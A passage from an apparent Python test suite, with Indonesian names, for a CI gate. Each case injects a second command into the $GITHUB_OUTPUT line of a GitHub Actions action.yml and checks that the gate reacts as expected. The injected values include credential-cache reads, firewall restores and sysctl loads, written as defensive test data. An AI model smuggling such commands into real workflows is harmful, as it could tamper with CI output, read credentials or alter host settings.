                    '>> "$GITHUB_OUTPUT"',
                    '> >(linux64 cat; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru475 != isi_aksi475, \
            "suntikan aksi475 tidak menembak"
        with open(berkas_aksi475, "w", encoding="utf-8") as f:
            f.write(isi_baru475)
        rc, out = jalan(sub475, [sys.executable, GERBANG, "--semua"])
        periksa("linux64 cat: "
                "gerbang gagal (Audit 1253)", rc != 0)
        shutil.rmtree(sub475, ignore_errors=True)
        sub476 = klon(tmp, "sub476")
        berkas_aksi476 = os.path.join(
            sub476, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi476, encoding="utf-8") as f:
            isi_aksi476 = f.read()
        baris_aksi476 = [b for b in isi_aksi476.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru476 = isi_aksi476.replace(
                baris_aksi476,
                baris_aksi476.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(uclampset -m 0 cat; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru476 != isi_aksi476, \
            "suntikan aksi476 tidak menembak"
        with open(berkas_aksi476, "w", encoding="utf-8") as f:
            f.write(isi_baru476)
        rc, out = jalan(sub476, [sys.executable, GERBANG, "--semua"])
        periksa("uclampset -m 0 cat: "
                "gerbang gagal (Audit 1254)", rc != 0)
        shutil.rmtree(sub476, ignore_errors=True)
        sub477 = klon(tmp, "sub477")
        berkas_aksi477 = os.path.join(
            sub477, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi477, encoding="utf-8") as f:
            isi_aksi477 = f.read()
        baris_aksi477 = [b for b in isi_aksi477.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru477 = isi_aksi477.replace(
                baris_aksi477,
                baris_aksi477.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(choom -n 0 -- cat; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru477 != isi_aksi477, \
            "suntikan aksi477 tidak menembak"
        with open(berkas_aksi477, "w", encoding="utf-8") as f:
            f.write(isi_baru477)
        rc, out = jalan(sub477, [sys.executable, GERBANG, "--semua"])
        periksa("choom -n 0 -- cat: "
                "gerbang gagal (Audit 1255)", rc != 0)
        shutil.rmtree(sub477, ignore_errors=True)
        sub478 = klon(tmp, "sub478")
        berkas_aksi478 = os.path.join(
            sub478, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi478, encoding="utf-8") as f:
            isi_aksi478 = f.read()
        baris_aksi478 = [b for b in isi_aksi478.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru478 = isi_aksi478.replace(
                baris_aksi478,
                baris_aksi478.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(xvfb-run -a cat; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru478 != isi_aksi478, \
            "suntikan aksi478 tidak menembak"
        with open(berkas_aksi478, "w", encoding="utf-8") as f:
            f.write(isi_baru478)
        rc, out = jalan(sub478, [sys.executable, GERBANG, "--semua"])
        periksa("xvfb-run -a cat: "
                "gerbang gagal (Audit 1256)", rc != 0)
        shutil.rmtree(sub478, ignore_errors=True)
        sub479 = klon(tmp, "sub479")
        berkas_aksi479 = os.path.join(
            sub479, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi479, encoding="utf-8") as f:
            isi_aksi479 = f.read()
        baris_aksi479 = [b for b in isi_aksi479.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru479 = isi_aksi479.replace(
                baris_aksi479,
                baris_aksi479.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(iptables-nft-restore; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru479 != isi_aksi479, \
            "suntikan aksi479 tidak menembak"
        with open(berkas_aksi479, "w", encoding="utf-8") as f:
            f.write(isi_baru479)
        rc, out = jalan(sub479, [sys.executable, GERBANG, "--semua"])
        periksa("iptables-nft-restore: "
                "gerbang gagal (Audit 1257)", rc != 0)
        shutil.rmtree(sub479, ignore_errors=True)
        sub480 = klon(tmp, "sub480")
        berkas_aksi480 = os.path.join(
            sub480, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi480, encoding="utf-8") as f:
            isi_aksi480 = f.read()
        baris_aksi480 = [b for b in isi_aksi480.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru480 = isi_aksi480.replace(
                baris_aksi480,
                baris_aksi480.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(ebtables-restore; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru480 != isi_aksi480, \
            "suntikan aksi480 tidak menembak"
        with open(berkas_aksi480, "w", encoding="utf-8") as f:
            f.write(isi_baru480)
        rc, out = jalan(sub480, [sys.executable, GERBANG, "--semua"])
        periksa("ebtables-restore: "
                "gerbang gagal (Audit 1257)", rc != 0)
        shutil.rmtree(sub480, ignore_errors=True)
        sub481 = klon(tmp, "sub481")
        berkas_aksi481 = os.path.join(
            sub481, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi481, encoding="utf-8") as f:
            isi_aksi481 = f.read()
        baris_aksi481 = [b for b in isi_aksi481.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru481 = isi_aksi481.replace(
                baris_aksi481,
                baris_aksi481.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(pdfinfo -; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru481 != isi_aksi481, \
            "suntikan aksi481 tidak menembak"
        with open(berkas_aksi481, "w", encoding="utf-8") as f:
            f.write(isi_baru481)
        rc, out = jalan(sub481, [sys.executable, GERBANG, "--semua"])
        periksa("pdfinfo -: "
                "gerbang gagal (Audit 1258)", rc != 0)
        shutil.rmtree(sub481, ignore_errors=True)
        sub482 = klon(tmp, "sub482")
        berkas_aksi482 = os.path.join(
            sub482, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi482, encoding="utf-8") as f:
            isi_aksi482 = f.read()
        baris_aksi482 = [b for b in isi_aksi482.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru482 = isi_aksi482.replace(
                baris_aksi482,
                baris_aksi482.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(pdftops - -; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru482 != isi_aksi482, \
            "suntikan aksi482 tidak menembak"
        with open(berkas_aksi482, "w", encoding="utf-8") as f:
            f.write(isi_baru482)
        rc, out = jalan(sub482, [sys.executable, GERBANG, "--semua"])
        periksa("pdftops - -: "
                "gerbang gagal (Audit 1258)", rc != 0)
        shutil.rmtree(sub482, ignore_errors=True)
        sub483 = klon(tmp, "sub483")
        berkas_aksi483 = os.path.join(
            sub483, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi483, encoding="utf-8") as f:
            isi_aksi483 = f.read()
        baris_aksi483 = [b for b in isi_aksi483.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru483 = isi_aksi483.replace(
                baris_aksi483,
                baris_aksi483.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(gm identify -; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru483 != isi_aksi483, \
            "suntikan aksi483 tidak menembak"
        with open(berkas_aksi483, "w", encoding="utf-8") as f:
            f.write(isi_baru483)
        rc, out = jalan(sub483, [sys.executable, GERBANG, "--semua"])
        periksa("gm identify -: "
                "gerbang gagal (Audit 1259)", rc != 0)
        shutil.rmtree(sub483, ignore_errors=True)
        sub484 = klon(tmp, "sub484")
        berkas_aksi484 = os.path.join(
            sub484, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi484, encoding="utf-8") as f:
            isi_aksi484 = f.read()
        baris_aksi484 = [b for b in isi_aksi484.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru484 = isi_aksi484.replace(
                baris_aksi484,
                baris_aksi484.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(chardetect; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru484 != isi_aksi484, \
            "suntikan aksi484 tidak menembak"
        with open(berkas_aksi484, "w", encoding="utf-8") as f:
            f.write(isi_baru484)
        rc, out = jalan(sub484, [sys.executable, GERBANG, "--semua"])
        periksa("chardetect: "
                "gerbang gagal (Audit 1260)", rc != 0)
        shutil.rmtree(sub484, ignore_errors=True)
        sub485 = klon(tmp, "sub485")
        berkas_aksi485 = os.path.join(
            sub485, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi485, encoding="utf-8") as f:
            isi_aksi485 = f.read()
        baris_aksi485 = [b for b in isi_aksi485.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru485 = isi_aksi485.replace(
                baris_aksi485,
                baris_aksi485.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(git cat-file --batch-check=%(objectname); cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru485 != isi_aksi485, \
            "suntikan aksi485 tidak menembak"
        with open(berkas_aksi485, "w", encoding="utf-8") as f:
            f.write(isi_baru485)
        rc, out = jalan(sub485, [sys.executable, GERBANG, "--semua"])
        periksa("git cat-file --batch-check=%(objectname): "
                "gerbang gagal (Audit 1261)", rc != 0)
        shutil.rmtree(sub485, ignore_errors=True)
        sub486 = klon(tmp, "sub486")
        berkas_aksi486 = os.path.join(
            sub486, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi486, encoding="utf-8") as f:
            isi_aksi486 = f.read()
        baris_aksi486 = [b for b in isi_aksi486.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru486 = isi_aksi486.replace(
                baris_aksi486,
                baris_aksi486.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(git apply --build-fake-ancestor idx; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru486 != isi_aksi486, \
            "suntikan aksi486 tidak menembak"
        with open(berkas_aksi486, "w", encoding="utf-8") as f:
            f.write(isi_baru486)
        rc, out = jalan(sub486, [sys.executable, GERBANG, "--semua"])
        periksa("git apply --build-fake-ancestor idx: "
                "gerbang gagal (Audit 1262)", rc != 0)
        shutil.rmtree(sub486, ignore_errors=True)
        sub487 = klon(tmp, "sub487")
        berkas_aksi487 = os.path.join(
            sub487, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi487, encoding="utf-8") as f:
            isi_aksi487 = f.read()
        baris_aksi487 = [b for b in isi_aksi487.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru487 = isi_aksi487.replace(
                baris_aksi487,
                baris_aksi487.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(iconv --usage; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru487 != isi_aksi487, \
            "suntikan aksi487 tidak menembak"
        with open(berkas_aksi487, "w", encoding="utf-8") as f:
            f.write(isi_baru487)
        rc, out = jalan(sub487, [sys.executable, GERBANG, "--semua"])
        periksa("iconv --usage: "
                "gerbang lolos (Audit 1263)", rc == 0)
        shutil.rmtree(sub487, ignore_errors=True)
        sub488 = klon(tmp, "sub488")
        berkas_aksi488 = os.path.join(
            sub488, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi488, encoding="utf-8") as f:
            isi_aksi488 = f.read()
        baris_aksi488 = [b for b in isi_aksi488.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru488 = isi_aksi488.replace(
                baris_aksi488,
                baris_aksi488.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(wc --total berkas.txt; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru488 != isi_aksi488, \
            "suntikan aksi488 tidak menembak"
        with open(berkas_aksi488, "w", encoding="utf-8") as f:
            f.write(isi_baru488)
        rc, out = jalan(sub488, [sys.executable, GERBANG, "--semua"])
        periksa("wc --total berkas.txt: "
                "gerbang lolos (Audit 1264)", rc == 0)
        shutil.rmtree(sub488, ignore_errors=True)
        sub489 = klon(tmp, "sub489")
        berkas_aksi489 = os.path.join(
            sub489, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi489, encoding="utf-8") as f:
            isi_aksi489 = f.read()
        baris_aksi489 = [b for b in isi_aksi489.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru489 = isi_aksi489.replace(
                baris_aksi489,
                baris_aksi489.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(numfmt --grouping 123; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru489 != isi_aksi489, \
            "suntikan aksi489 tidak menembak"
        with open(berkas_aksi489, "w", encoding="utf-8") as f:
            f.write(isi_baru489)
        rc, out = jalan(sub489, [sys.executable, GERBANG, "--semua"])
        periksa("numfmt --grouping 123: "
                "gerbang lolos (Audit 1265)", rc == 0)
        shutil.rmtree(sub489, ignore_errors=True)
        sub490 = klon(tmp, "sub490")
        berkas_aksi490 = os.path.join(
            sub490, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi490, encoding="utf-8") as f:
            isi_aksi490 = f.read()
        baris_aksi490 = [b for b in isi_aksi490.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru490 = isi_aksi490.replace(
                baris_aksi490,
                baris_aksi490.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(git cat-file --batch-all-objects --batch; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru490 != isi_aksi490, \
            "suntikan aksi490 tidak menembak"
        with open(berkas_aksi490, "w", encoding="utf-8") as f:
            f.write(isi_baru490)
        rc, out = jalan(sub490, [sys.executable, GERBANG, "--semua"])
        periksa("git cat-file --batch-all-objects --batch: "
                "gerbang lolos (Audit 1266)", rc == 0)
        shutil.rmtree(sub490, ignore_errors=True)
        sub491 = klon(tmp, "sub491")
        berkas_aksi491 = os.path.join(
            sub491, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi491, encoding="utf-8") as f:
            isi_aksi491 = f.read()
        baris_aksi491 = [b for b in isi_aksi491.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru491 = isi_aksi491.replace(
                baris_aksi491,
                baris_aksi491.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(git commit --pathspec-from-file=-; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru491 != isi_aksi491, \
            "suntikan aksi491 tidak menembak"
        with open(berkas_aksi491, "w", encoding="utf-8") as f:
            f.write(isi_baru491)
        rc, out = jalan(sub491, [sys.executable, GERBANG, "--semua"])
        periksa("git commit --pathspec-from-file=-: "
                "gerbang gagal (Audit 1268)", rc != 0)
        shutil.rmtree(sub491, ignore_errors=True)
        sub492 = klon(tmp, "sub492")
        berkas_aksi492 = os.path.join(
            sub492, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi492, encoding="utf-8") as f:
            isi_aksi492 = f.read()
        baris_aksi492 = [b for b in isi_aksi492.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru492 = isi_aksi492.replace(
                baris_aksi492,
                baris_aksi492.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(git add --chmod --pathspec-from-file=-; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru492 != isi_aksi492, \
            "suntikan aksi492 tidak menembak"
        with open(berkas_aksi492, "w", encoding="utf-8") as f:
            f.write(isi_baru492)
        rc, out = jalan(sub492, [sys.executable, GERBANG, "--semua"])
        periksa("git add --chmod --pathspec-from-file=-: "
                "gerbang lolos (Audit 1269)", rc == 0)
        shutil.rmtree(sub492, ignore_errors=True)
        sub493 = klon(tmp, "sub493")
        berkas_aksi493 = os.path.join(
            sub493, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi493, encoding="utf-8") as f:
            isi_aksi493 = f.read()
        baris_aksi493 = [b for b in isi_aksi493.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru493 = isi_aksi493.replace(
                baris_aksi493,
                baris_aksi493.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(git check-mailmap --stdin 'A <a@b.c>'; cat "
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru493 != isi_aksi493, \
            "suntikan aksi493 tidak menembak"
        with open(berkas_aksi493, "w", encoding="utf-8") as f:
            f.write(isi_baru493)
        rc, out = jalan(sub493, [sys.executable, GERBANG, "--semua"])
        periksa("git check-mailmap --stdin 'A <a@b.c>': "
                "gerbang gagal (Audit 1270)", rc != 0)
        shutil.rmtree(sub493, ignore_errors=True)
        sub494 = klon(tmp, "sub494")
        berkas_aksi494 = os.path.join(
            sub494, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi494, encoding="utf-8") as f:
            isi_aksi494 = f.read()
        baris_aksi494 = [b for b in isi_aksi494.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru494 = isi_aksi494.replace(
                baris_aksi494,
                baris_aksi494.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(git credential-cache --timeout 300 get; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru494 != isi_aksi494, \
            "suntikan aksi494 tidak menembak"
        with open(berkas_aksi494, "w", encoding="utf-8") as f:
            f.write(isi_baru494)
        rc, out = jalan(sub494, [sys.executable, GERBANG, "--semua"])
        periksa("git credential-cache --timeout 300 get: "
                "gerbang gagal (Audit 1271)", rc != 0)
        shutil.rmtree(sub494, ignore_errors=True)
        sub495 = klon(tmp, "sub495")
        berkas_aksi495 = os.path.join(
            sub495, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi495, encoding="utf-8") as f:
            isi_aksi495 = f.read()
        baris_aksi495 = [b for b in isi_aksi495.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru495 = isi_aksi495.replace(
                baris_aksi495,
                baris_aksi495.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(git shortlog --since yesterday; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru495 != isi_aksi495, \
            "suntikan aksi495 tidak menembak"
        with open(berkas_aksi495, "w", encoding="utf-8") as f:
            f.write(isi_baru495)
        rc, out = jalan(sub495, [sys.executable, GERBANG, "--semua"])
        periksa("git shortlog --since yesterday: "
                "gerbang gagal (Audit 1272)", rc != 0)
        shutil.rmtree(sub495, ignore_errors=True)
        sub496 = klon(tmp, "sub496")
        berkas_aksi496 = os.path.join(
            sub496, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi496, encoding="utf-8") as f:
            isi_aksi496 = f.read()
        baris_aksi496 = [b for b in isi_aksi496.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru496 = isi_aksi496.replace(
                baris_aksi496,
                baris_aksi496.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(git am --whitespace fix; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru496 != isi_aksi496, \
            "suntikan aksi496 tidak menembak"
        with open(berkas_aksi496, "w", encoding="utf-8") as f:
            f.write(isi_baru496)
        rc, out = jalan(sub496, [sys.executable, GERBANG, "--semua"])
        periksa("git am --whitespace fix: "
                "gerbang gagal (Audit 1273)", rc != 0)
        shutil.rmtree(sub496, ignore_errors=True)
        sub497 = klon(tmp, "sub497")
        berkas_aksi497 = os.path.join(
            sub497, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi497, encoding="utf-8") as f:
            isi_aksi497 = f.read()
        baris_aksi497 = [b for b in isi_aksi497.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru497 = isi_aksi497.replace(
                baris_aksi497,
                baris_aksi497.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(git notes add -fF- HEAD; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru497 != isi_aksi497, \
            "suntikan aksi497 tidak menembak"
        with open(berkas_aksi497, "w", encoding="utf-8") as f:
            f.write(isi_baru497)
        rc, out = jalan(sub497, [sys.executable, GERBANG, "--semua"])
        periksa("git notes add -fF- HEAD: "
                "gerbang gagal (Audit 1274)", rc != 0)
        shutil.rmtree(sub497, ignore_errors=True)
        sub498 = klon(tmp, "sub498")
        berkas_aksi498 = os.path.join(
            sub498, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi498, encoding="utf-8") as f:
            isi_aksi498 = f.read()
        baris_aksi498 = [b for b in isi_aksi498.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru498 = isi_aksi498.replace(
                baris_aksi498,
                baris_aksi498.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(patch -f --help; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru498 != isi_aksi498, \
            "suntikan aksi498 tidak menembak"
        with open(berkas_aksi498, "w", encoding="utf-8") as f:
            f.write(isi_baru498)
        rc, out = jalan(sub498, [sys.executable, GERBANG, "--semua"])
        periksa("patch -f --help: "
                "gerbang lolos (Audit 1275)", rc == 0)
        shutil.rmtree(sub498, ignore_errors=True)
        sub499 = klon(tmp, "sub499")
        berkas_aksi499 = os.path.join(
            sub499, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi499, encoding="utf-8") as f:
            isi_aksi499 = f.read()
        baris_aksi499 = [b for b in isi_aksi499.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru499 = isi_aksi499.replace(
                baris_aksi499,
                baris_aksi499.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(iconv -o --usage; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru499 != isi_aksi499, \
            "suntikan aksi499 tidak menembak"
        with open(berkas_aksi499, "w", encoding="utf-8") as f:
            f.write(isi_baru499)
        rc, out = jalan(sub499, [sys.executable, GERBANG, "--semua"])
        periksa("iconv -o --usage: "
                "gerbang gagal (Audit 1276)", rc != 0)
        shutil.rmtree(sub499, ignore_errors=True)
        sub500 = klon(tmp, "sub500")
        berkas_aksi500 = os.path.join(
            sub500, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi500, encoding="utf-8") as f:
            isi_aksi500 = f.read()
        baris_aksi500 = [b for b in isi_aksi500.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru500 = isi_aksi500.replace(
                baris_aksi500,
                baris_aksi500.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(prlimit -p=999999 cat; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru500 != isi_aksi500, \
            "suntikan aksi500 tidak menembak"
        with open(berkas_aksi500, "w", encoding="utf-8") as f:
            f.write(isi_baru500)
        rc, out = jalan(sub500, [sys.executable, GERBANG, "--semua"])
        periksa("prlimit -p=999999 cat: "
                "gerbang lolos (Audit 1277)", rc == 0)
        shutil.rmtree(sub500, ignore_errors=True)
        sub501 = klon(tmp, "sub501")
        berkas_aksi501 = os.path.join(
            sub501, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi501, encoding="utf-8") as f:
            isi_aksi501 = f.read()
        baris_aksi501 = [b for b in isi_aksi501.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru501 = isi_aksi501.replace(
                baris_aksi501,
                baris_aksi501.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(openssl x509 -in /dev/stdin -in /dev/null; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru501 != isi_aksi501, \
            "suntikan aksi501 tidak menembak"
        with open(berkas_aksi501, "w", encoding="utf-8") as f:
            f.write(isi_baru501)
        rc, out = jalan(sub501, [sys.executable, GERBANG, "--semua"])
        periksa("openssl x509 -in /dev/stdin -in /dev/null: "
                "gerbang lolos (Audit 1278)", rc == 0)
        shutil.rmtree(sub501, ignore_errors=True)
        sub502 = klon(tmp, "sub502")
        berkas_aksi502 = os.path.join(
            sub502, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi502, encoding="utf-8") as f:
            isi_aksi502 = f.read()
        baris_aksi502 = [b for b in isi_aksi502.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru502 = isi_aksi502.replace(
                baris_aksi502,
                baris_aksi502.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(file -f /dev/stdin; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru502 != isi_aksi502, \
            "suntikan aksi502 tidak menembak"
        with open(berkas_aksi502, "w", encoding="utf-8") as f:
            f.write(isi_baru502)
        rc, out = jalan(sub502, [sys.executable, GERBANG, "--semua"])
        periksa("file -f /dev/stdin: "
                "gerbang gagal (Audit 1279)", rc != 0)
        shutil.rmtree(sub502, ignore_errors=True)
        sub503 = klon(tmp, "sub503")
        berkas_aksi503 = os.path.join(
            sub503, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi503, encoding="utf-8") as f:
            isi_aksi503 = f.read()
        baris_aksi503 = [b for b in isi_aksi503.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru503 = isi_aksi503.replace(
                baris_aksi503,
                baris_aksi503.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(date -Rf-; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru503 != isi_aksi503, \
            "suntikan aksi503 tidak menembak"
        with open(berkas_aksi503, "w", encoding="utf-8") as f:
            f.write(isi_baru503)
        rc, out = jalan(sub503, [sys.executable, GERBANG, "--semua"])
        periksa("date -Rf-: "
                "gerbang gagal (Audit 1280)", rc != 0)
        shutil.rmtree(sub503, ignore_errors=True)
        sub504 = klon(tmp, "sub504")
        berkas_aksi504 = os.path.join(
            sub504, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi504, encoding="utf-8") as f:
            isi_aksi504 = f.read()
        baris_aksi504 = [b for b in isi_aksi504.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru504 = isi_aksi504.replace(
                baris_aksi504,
                baris_aksi504.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(sysctl -f -; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru504 != isi_aksi504, \
            "suntikan aksi504 tidak menembak"
        with open(berkas_aksi504, "w", encoding="utf-8") as f:
            f.write(isi_baru504)
        rc, out = jalan(sub504, [sys.executable, GERBANG, "--semua"])
        periksa("sysctl -f -: "
                "gerbang gagal (Audit 1281)", rc != 0)
        shutil.rmtree(sub504, ignore_errors=True)
        sub505 = klon(tmp, "sub505")
        berkas_aksi505 = os.path.join(
            sub505, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi505, encoding="utf-8") as f:
            isi_aksi505 = f.read()
        baris_aksi505 = [b for b in isi_aksi505.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru505 = isi_aksi505.replace(
                baris_aksi505,
                baris_aksi505.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(sdiff -W - target.txt; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru505 != isi_aksi505, \
            "suntikan aksi505 tidak menembak"
        with open(berkas_aksi505, "w", encoding="utf-8") as f:
            f.write(isi_baru505)
        rc, out = jalan(sub505, [sys.executable, GERBANG, "--semua"])
        periksa("sdiff -W - target.txt: "
                "gerbang gagal (Audit 1282)", rc != 0)
        shutil.rmtree(sub505, ignore_errors=True)
        sub506 = klon(tmp, "sub506")
        berkas_aksi506 = os.path.join(
            sub506, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi506, encoding="utf-8") as f:
            isi_aksi506 = f.read()
        baris_aksi506 = [b for b in isi_aksi506.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru506 = isi_aksi506.replace(
                baris_aksi506,
                baris_aksi506.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(pdfinfo -enc UTF-8 -; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru506 != isi_aksi506, \
            "suntikan aksi506 tidak menembak"
        with open(berkas_aksi506, "w", encoding="utf-8") as f:
            f.write(isi_baru506)
        rc, out = jalan(sub506, [sys.executable, GERBANG, "--semua"])
        periksa("pdfinfo -enc UTF-8 -: "
                "gerbang gagal (Audit 1283)", rc != 0)
        shutil.rmtree(sub506, ignore_errors=True)
        sub507 = klon(tmp, "sub507")
        berkas_aksi507 = os.path.join(
            sub507, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi507, encoding="utf-8") as f:
            isi_aksi507 = f.read()
        baris_aksi507 = [b for b in isi_aksi507.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru507 = isi_aksi507.replace(
                baris_aksi507,
                baris_aksi507.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(gm identify -format - /tmp/p81.png; cat '
